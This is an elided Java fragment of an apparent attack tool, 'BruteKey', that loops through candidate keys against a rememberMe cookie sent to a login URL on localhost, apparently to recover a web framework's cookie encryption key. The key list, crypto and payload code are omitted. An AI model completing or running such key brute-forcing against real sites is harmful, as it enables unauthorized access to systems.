...
public class BruteKey {
     ...
     * @return 正确的key
     */
    public static KeyInfoObj bruteKey(TargetOBJ url) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
     ...
     * @return 正确的key
     */
    public static KeyInfoObj bruteKey(TargetOBJ url, String rememberMeString) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        String key;
        ...
        for (int i = 0; i < keys.length; i++) {
            ...
            System.out.println(Log.buffer_logging("INFO", "正在尝试key: " + keys[i]));
    ...
    public static void main(String[] args) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        KeyInfoObj key = bruteKey(new TargetOBJ("http://127.0.0.1:8080/login"));
